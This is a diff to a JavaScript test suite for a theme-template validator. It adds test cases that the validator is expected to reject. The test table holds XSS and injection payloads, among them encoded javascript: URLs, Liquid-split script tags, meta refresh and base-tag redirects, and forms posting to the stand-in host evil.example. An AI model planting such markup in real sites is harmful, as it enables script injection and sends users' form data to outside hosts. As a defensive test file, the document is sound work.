@@ -206,6 +206,23 @@ describe('validateTheme', () => {
       ['a handler right after a quote', '<a href="/"onclick="x()">x</a>', 'event-handler'],
       ['an entity-encoded scheme', '<a href="jav&#x61;script:alert(1)">x</a>', 'javascript-url'],
       ['a tab inside the scheme', '<a href="java\tscript:alert(1)">x</a>', 'javascript-url'],
+      ['a base element', '<base href="https://evil.example/">', 'markup'],
+      [
+        'a meta refresh',
+        '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
+        'markup',
+      ],
+      ['an object element', '<object data="/assets/x.swf"></object>', 'markup'],
+      [
+        'a form posting elsewhere',
+        '<form action="https://evil.example/collect"></form>',
+        'external-host',
+      ],
+      [
+        'a button posting elsewhere',
+        '<button formaction="//evil.example/">x</button>',
+        'external-host',
+      ],
       ['Liquid inside a tag name', "<scr{{ '' }}ipt>alert(1)</script>", 'markup'],
       ['Liquid inside an attribute name', '<a on{{ \'click\' }}="x()">x</a>', 'markup'],
     ])('catches %s', async (_name, source, rule) => {
